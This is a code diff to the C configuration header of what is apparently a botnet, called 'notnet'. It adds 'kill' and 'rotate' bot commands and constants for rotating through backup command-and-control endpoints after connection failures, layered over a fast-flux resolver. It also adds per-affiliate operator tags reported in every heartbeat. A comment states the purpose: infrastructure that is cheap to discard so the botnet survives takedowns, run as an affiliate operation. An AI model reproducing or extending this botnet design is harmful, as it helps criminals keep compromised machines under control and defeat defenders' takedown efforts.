@@ -97,6 +97,8 @@
 #define CMD_PROXY            "proxy"
 #define CMD_RELAY            "relay"
 #define CMD_PLUGIN           "plugin"
+#define CMD_KILL             "kill"
+#define CMD_ROTATE           "rotate"
 #define CMD_PING             "ping"
 #define CMD_PONG             "pong"
 
@@ -178,5 +180,25 @@
 #define PLUGIN_MAX_REGISTRY     8
 #define PLUGIN_NAME_MAX         32
 #define PLUGIN_DEFAULT_ENABLED  1
+
+/* ── Disposable Infrastructure + Affiliate Ops (#93) ─────── */
+/* Organizational resilience, not technical: the durable answer to
+ * takedown is disposable C2 (rotate endpoints, rebuild fast) and
+ * affiliate-structured operations (per-operator tags, clean capacity
+ * hand-back), not DGA/P2P/rootkit tricks (#87/#88 dropped those).
+ * C2 rotation sits ABOVE the flux resolver (#85): flux rotates IPs
+ * within one hostname, rotation switches the whole HTTP endpoint
+ * through the bounded c2_backup_<n> chain. After
+ * C2_ROTATE_FAIL_THRESHOLD consecutive primary-channel connect
+ * failures the bot advances to the next endpoint and logs the
+ * rotation; C2_ROTATE_MAX caps total automatic rotations so a fully
+ * dead fleet cannot churn forever. bot_tag is the affiliate-model
+ * primitive: a short operator/campaign identifier reported in every
+ * heartbeat so the C2 can attribute bots to affiliates. */
+#define C2_BACKUP_MAX            4     /* max c2_backup_<n> entries */
+#define C2_BACKUP_STR_MAX        256   /* "host:port" entry size */
+#define C2_ROTATE_FAIL_THRESHOLD 3     /* consecutive failures before rotate */
+#define C2_ROTATE_MAX            16    /* total automatic rotations/process */
+#define BOT_TAG_MAX              64    /* affiliate/operator tag length */
 
 #endif /* NOTNET_CONFIG_H */
